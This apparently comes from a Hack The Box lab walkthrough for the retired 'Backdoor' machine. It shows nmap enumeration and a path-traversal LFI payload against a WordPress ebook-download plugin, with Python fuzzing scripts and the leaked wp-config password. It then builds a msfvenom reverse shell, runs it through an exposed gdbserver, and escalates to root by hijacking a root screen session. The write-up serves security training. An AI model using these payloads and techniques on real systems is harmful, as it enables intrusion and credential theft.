---
layout: default
title: Backdoor
description: Walkthrough for retired HTB box Backdoor
parent: Hack The Box
nav_order: 1
has_children: false
permalink: /htb/backdoor
date: 2022-06-06
image: /assets/images/htb/backdoor/banner.png
---
# Backdoor Lab Report
![Screenshot 1](/assets/images/htb/backdoor/banner.png)
# 1 Enumeration
## 1.1 NMAP
```
# Nmap 7.91 scan initiated Sun Jan 16 19:11:03 2022 as: nmap -sC -sV -oA backdoor backdoor.htb
Nmap scan report for backdoor.htb
Host is up (0.21s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 16 19:11:40 2022 -- 1 IP address (1 host up) scanned in 37.58 seconds
```
## 1.2 Nmap All Ports
```
# Nmap 7.91 scan initiated Wed Jan 19 22:59:36 2022 as: nmap -sS -p- --min-rate=1000 -oA backdoor-all-ports backdoor.htb
Nmap scan report for backdoor.htb (backdoor.htb)
Host is up (0.22s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste

# Nmap done at Wed Jan 19 23:00:47 2022 -- 1 IP address (1 host up) scanned in 70.57 seconds
```

# 2 Foothold
## 2.2 Check plugins directory
http://backdoor.htb/wp-content/plugins/
```
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[DIR]	ebook-download/	2021-11-10 14:18 	- 	 
[ ]	hello.php	2019-03-18 17:19 	2.5K	 
```

## 2.3 Find LFI vuln at ebook-download plugin
<a href="https://www.exploit-db.com/exploits/39575">https://www.exploit-db.com/exploits/39575</a>
```
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
```

## 2.4 Fuzzing 
### Manually (provide file path as argv1)
Python Script
```
import requests,sys

r = requests.get("http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=" + sys.argv[1])
print(r.text)
```
wp-config.php
```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```
/etc/passwd
```
/etc/passwd/etc/passwd/etc/passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
```

### Automatically (provide LFI file list as argv1)
Seclists (/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt)
```
import requests,sys
lines = open(sys.argv[1],"r").read().splitlines()

for line in lines: 
    r = requests.get("http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=" + line)
    output = open("LFI/" + line.replace("/", "_"),"w")
    output.write(r.text)
```

### Read /proc/sched_debug
```
python3 backdoor-2.py /proc/sched_debug | grep gdbserver
 S      gdbserver 161671        32.449731        13   120         0.000000         4.427913         0.000000 0 0 /autogroup-208
```
### Read gdbserver cmdline
```
$ python3 backdoor-2.py /proc/161671/cmdline              
/proc/161671/cmdline/proc/161671/cmdline/proc/161671/cmdlinegdbserver--once0.0.0.0:1337/bin/true<script>window.close()</script>
```
-> Port 1337 waste is running a GDB Server

# 3 User
## 3.1 Generate payload
``` 
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf
```

## 3.2 CHMOD
```
chmod +x binary.elf
```
## 3.3 Execute GDB
```
gdb binary.elf
# I am running an ARM system, for that I had to use gdb-multiarch instead
# gdb-multiarch binary.elf
```
## 3.4 Set remote debuger target
```
target extended-remote 10.10.10.11:1337
```

## 3.5 Upload elf file
```
remote put binary.elf binary.elf
```
## 3.6 Set remote executable file
```
set remote exec-file /home/user/binary.elf
```
## 3.7 Netcat on LPORT
```
nc -lvnp 4444
```
## 3.8 Execute reverse shell executable
```
run
```
-> Reverse Shell at NC port 4444

## 3.9 Python3 SSH shell
```
python3 -c "import pty; pty.spawn('/bin/bash')"
```

## 3.10 Optional SSH connection
```
TARGET:
ssh-keygen
scp id_rsa.pub authorized_keys

ATTACKER:
chmod 700 id_rsa
ssh -i id_rsa user@backdoor.htb
```

# 4 Privilege Escalation
## 4.1 Enumeration with linpeas
## 4.2 Check output
```
root         839  0.0  0.0   2608  1676 ?        Ss   05:30   0:14 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
user      186826  0.0  0.0   6432   732 pts/7    S+   13:51   0:00 grep --color=auto screen
```
## 4.3 Hijack root screen (Multi display mode)
```
screen -x /root/root
-x Attach to a not detached screen. (Multi display mode).
```
Done.
